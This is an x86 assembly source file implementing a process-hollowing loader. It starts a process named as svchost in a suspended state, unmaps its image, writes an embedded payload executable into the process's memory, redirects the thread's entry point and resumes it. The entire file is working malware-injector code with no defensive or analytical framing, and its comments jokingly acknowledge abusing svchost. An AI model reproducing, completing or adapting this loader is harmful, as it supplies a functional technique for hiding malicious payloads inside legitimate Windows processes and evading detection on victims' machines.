%define HIMEM 					0x00800000 + BASE

%define Kernel32Handle			HIMEM + 0x4000
%define lpProcessInformation	Kernel32Handle + 4
%define hProcess					lpProcessInformation
%define hThread						lpProcessInformation + 4
%define dwProcessId					lpProcessInformation + 8
%define dwThreadId					lpProcessInformation + 12
%define NtdllHandle				dwThreadId + 4
%define mThreadContext			NtdllHandle + 4
%define mThreadContextEbx		mThreadContext + 164
%define mThreadContextEax		mThreadContext + 176
%define mRemoteImageBase		mThreadContext + 716

%macro IMPORT 3
	push %3
	push dword [%1]
	call [GetProcAddress]
	mov dword [%2], eax
%endmacro


str_svchost:	db APPNAME,0
str_ntdll:		db 'ntdll',0
str_reloc:		db '.reloc'


%define CreateProcessA			HIMEM + 0x8000
str_CreateProcessA: 			db 'CreateProcessA',0 
%define NtUnmapViewOfSection	CreateProcessA + 4
str_NtUnmapViewOfSection:		db 'NtUnmapViewOfSection',0 
%define GetThreadContext		NtUnmapViewOfSection + 4
str_GetThreadContext: 			db 'GetThreadContext',0 
%define ReadProcessMemory		GetThreadContext + 4
str_ReadProcessMemory: 			db 'ReadProcessMemory',0 
%define VirtualAllocEx			ReadProcessMemory + 4
str_VirtualAllocEx: 			db 'VirtualAllocEx',0 
%define WriteProcessMemory		VirtualAllocEx + 4
str_WriteProcessMemory: 		db 'WriteProcessMemory',0 
%define SetThreadContext		WriteProcessMemory + 4
str_SetThreadContext: 			db 'SetThreadContext',0 
%define ResumeThread			SetThreadContext + 4
str_ResumeThread: 				db 'ResumeThread',0 
%define WaitForSingleObject		ResumeThread + 4
str_WaitForSingleObject: 		db 'WaitForSingleObject',0 




;; === Function Imports ===
ImportFunctions:
	; Load Kernel32 module handle
	push __kernel32
	call [LoadLibraryA]
	mov dword [Kernel32Handle], eax 
	; Load Ntdll module handle
	push str_ntdll
	call [LoadLibraryA]
	mov dword [NtdllHandle], eax 

	IMPORT Kernel32Handle, CreateProcessA, str_CreateProcessA
	IMPORT Kernel32Handle, GetThreadContext, str_GetThreadContext
	IMPORT Kernel32Handle, ReadProcessMemory, str_ReadProcessMemory
	IMPORT Kernel32Handle, VirtualAllocEx, str_VirtualAllocEx
	IMPORT Kernel32Handle, WriteProcessMemory, str_WriteProcessMemory
	IMPORT Kernel32Handle, SetThreadContext, str_SetThreadContext
	IMPORT Kernel32Handle, ResumeThread, str_ResumeThread
	IMPORT Kernel32Handle, WaitForSingleObject, str_WaitForSingleObject

	IMPORT NtdllHandle, NtUnmapViewOfSection, str_NtUnmapViewOfSection

	ret

; eax: source address
; ebx: target address
; ecx: length
memcpy:
	cmp ecx, 0
	jle memcpy_done
	mov edx, [eax]
	mov [ebx], edx
	inc eax
	inc ebx
	dec ecx
	jmp memcpy 
memcpy_done:
	ret

; ecx: section header
; edx: remote base address
copysec:
	pusha
	add ecx, 12
	add edx, [ecx]
	add ecx, 4
	push 0
	push dword [ecx]
	add ecx, 4
	mov eax, [ecx]
	add eax, __end
	push eax
	push edx
	push dword [hProcess]
	call [WriteProcessMemory]
	popa
	ret

;; ==== Actual code goes here ====
_main:
	mov eax, __data
	mov ebx, __end
	mov ecx, [__datasize]
	call memcpy

	call ImportFunctions

	; Yay, poor svchost having to deal with our shit again :-(
	push lpProcessInformation
	push HIMEM
	times 2 push 0
	push 4		; Create suspended
	times 3 push 0
	push str_svchost
	push 0
	call [CreateProcessA]

	; Read thread context so se can determine the
	; newly spawned process' base address
	mov dword [mThreadContext], 7	; CONTEXT_FULL
	push mThreadContext
	push dword [hThread]
	call [GetThreadContext]

	; Determine base address by reading target process memory
	mov eax, dword [mThreadContextEbx]
	add eax, 8
	push 0
	push 4
	push mRemoteImageBase
	push eax
	push dword [hProcess]
	call [ReadProcessMemory]

	; Unmap the loaded process executable from memory
	push dword [mRemoteImageBase]
	push dword [hProcess]
	call [NtUnmapViewOfSection]

	push 0x40			; PAGE_EXECUTE_READWRITE
	push 0x00003000		; MEM_COMMIT | MEM_RESERVE
	push dword [ImageSize]	; Alloc size
	push dword [mRemoteImageBase]
	push dword [hProcess]
	call [VirtualAllocEx]

	mov eax, [__end + 0x3c] ; Move offset of PE header start into eax
	add eax, __end			; Now points to PE header start
	

	mov ebx, [eax + 0xA0]	; Check if payload image has relocations
	cmp ebx, 0
	jnz _hasRelocNope		; Nope, not touching images with dynamic 
							; base address! Recompile that shit without
							; relocations first

	mov ebx, [eax + 0x34]	; Base address of payload image
	mov ecx, [mRemoteImageBase]
	mov [eax + 0x34], ecx	; Update payload base address
	sub ecx, ebx			; ecx holds image base delta 
	mov ebx, [eax + 0x54]	; Size of payload headers

	push eax				; Save eax because we need it again!
							; Woule be better stored in a different 
							; register than the one used for 
							; return values, probably...
	push 0
	push ebx
	push __end
	push dword [mRemoteImageBase]
	push dword [hProcess]
	call [WriteProcessMemory]

	pop eax					; Resore that fucker

	mov bx, [eax + 0x06]	; number of sections
	mov ecx, eax
	add ecx, 0xF8			; move pointer to first section header
	mov edx, [mRemoteImageBase]

_copyNext:					; Copy over all sections to the target
	cmp ebx, 0
	jle _copyDone
	call copysec
	dec ebx
	add ecx, 40
	jmp _copyNext
_copyDone:

	; Reading thread context again, might be redundant...
	; For now I'll leave it here for good measure
	
	; mov dword [mThreadContext], 0x00010002	; CONTEXT_INTEGER
	; push mThreadContext
	; push dword [hThread]
	; call [GetThreadContext]

	mov eax, [__end + 0x3c] 		; Move offset of PE header start into eax
	add eax, __end					; Now points to PE header start
	mov ebx, [mRemoteImageBase]		; Image base of payload
	add ebx, [eax + 0x28]			; Move pointer forward so the entry point is correct
	mov [mThreadContextEax], ebx	; Update eax in the target thread context
	
	push mThreadContext				; Update the thread context in the target
	push dword [hThread]			; thread so we can resume execution
	call [SetThreadContext]

	push dword [hThread]
	call [ResumeThread]				; Magic

	push 0xffffffff
	push dword [hThread]
	call [WaitForSingleObject]

_hasRelocNope:
	ret

CreateProcess:
